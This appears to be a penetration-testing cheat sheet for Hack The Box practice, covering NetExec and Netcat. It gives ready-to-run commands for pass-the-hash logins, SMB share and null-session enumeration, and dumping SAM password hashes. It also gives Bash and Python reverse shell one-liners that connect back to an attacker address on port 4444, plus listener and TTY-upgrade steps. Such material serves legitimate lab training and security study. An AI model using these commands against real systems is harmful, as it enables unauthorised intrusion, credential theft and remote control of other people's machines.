1. **`nxc` (NetExec)** — a combined tool for Windows/Active Directory networks (replacing the outdated CrackMapExec). This is the perfect follow-up to Responder.
2. **`nc` (Netcat)** or **`ncat`** — a hacker's Swiss Army knife for catching shells.

I've written cheat sheets for both; grab the one you're looking for!

> [!note] Cheat Sheet: NetExec (nxc) — Fork of CrackMapExec #activedirectory #smb #pass-the-hash

This is your main tool for reconnaissance and advancement on Windows networks. If you have at least one Windows login/password or hash, put it here.

# 1. Credential check (does the login/password match the machine)
```
nxc smb 10.10.10.10 -u 'admin' -p 'password123'
```
# 2. Pass-the-Hash (login by hash if the password is not decrypted)
```
nxc smb 10.10.10.10 -u 'admin' -H 'aad3b435b51404eeaad3b435b51404ee:NTLM_HASH'
```
# 3. Share (network folder) reconnaissance. The --shares flag will show where you have access (READ/WRITE)
```
nxc smb 10.10.10.10 -u 'admin' -p 'password123' --shares
```
# 4. Checking for known vulnerabilities without login (e.g., Null Session)
```
nxc smb 10.10.10.10 -u '' -p '' --shares
```
# 5. Dumping local passwords/hashes from the machine (if you have local admin rights Pwn3d!)
```
nxc smb 10.10.10.10 -u 'admin' -p 'password123' --sam
```

> [!note] Cheat Sheet: Netcat (nc / ncat) #shell #netcat #listener

The main tool for receiving Reverse Shell (reverse connections) when you've exploited a web vulnerability And the server is knocking on your door.

### 1. Running a basic listener on Kali

Open the port and wait for the target to connect.
```
nc -lvnp 4444
```

### 2. Improved listener (with command history)

Use `rlwrap` to enable the keyboard arrow keys (up/down for history) in the resulting shell.
```
rlwrap nc -lvnp 4444
```

### 3. Classic Reverse Shell (Bash)

Send this command to the vulnerable Linux server (change the IP to your VPN in HTB).
```
bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'
```

### 4. Reverse Shell (Python 3)

If Bash is disabled or filtered, but Python is installed on the server.
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### 5. Stabilizing a Dumb Shell (TTY Upgrade)

If the shell breaks when you press Ctrl+C or Tab doesn't work, first enter the following on the jailbroken machine:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then press Ctrl + Z (the shell will disappear into the background). After that, on your Kali machine, enter:
```
stty raw -echo; fg
```
